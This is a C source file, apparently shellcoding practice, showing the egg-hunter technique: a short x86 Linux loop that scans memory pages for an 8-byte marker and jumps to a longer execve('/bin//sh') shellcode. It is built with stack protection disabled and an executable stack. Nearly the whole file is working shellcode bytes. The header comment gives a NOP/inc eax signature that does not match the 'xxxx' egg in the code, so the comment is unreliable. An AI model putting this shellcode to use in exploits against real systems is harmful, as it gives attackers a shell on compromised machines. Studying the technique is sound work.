#include <stdio.h>

/*
 *  Scope of this code is to demonstrate how we can exploit a program when the space for the shellcode is limited
 *  1. we place the real long shellcode somewhere (shellcode[])
 *  2. we execute a shorter code called egg-hunter(egg_hunter[])
 *
 *  How it works
 *  1. The long shellcode contains a combnation of NOP and inc eax opcodes as a signature (\x9050905090509050), in total 8 bytes
 *  2. The egg_hunter loops through the virtual memory pages (4 KB) and looks thourh
 *    2.1 using access it tries to access the first byte of a page (page alignement of edx)
 *    2.2 if not possibile it jump to next page
 *    2.3 if possibile it scans the page and compare 4 bytes and then the other 4 bytes
 *    2.4 if both matches, it jmp to that address
 *
 *    As a reference look at egg.asm code
 *
 *    Compile with:  
 *      gcc -fno-stack-protector -z execstack
*/


 #define EGG "\x78\x78\x78\x78"        // the EGG, here: "xxxx"

int main(void)
{

	char egg_hunter[50] = "\xfc\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f"
              "\x42\x6a\x21\x58\x8d\x5a\x04\xcd\x80\x3c"
              "\xf2\x74\xee\xb8"
              "\x78\x78\x78\x78"   // <- Signature
              "\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";

	char shellcode[100] = "\x78\x78\x78\x78\x78\x78\x78\x78\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";


	void (*s)() = (void *)egg_hunter;
	s();
}

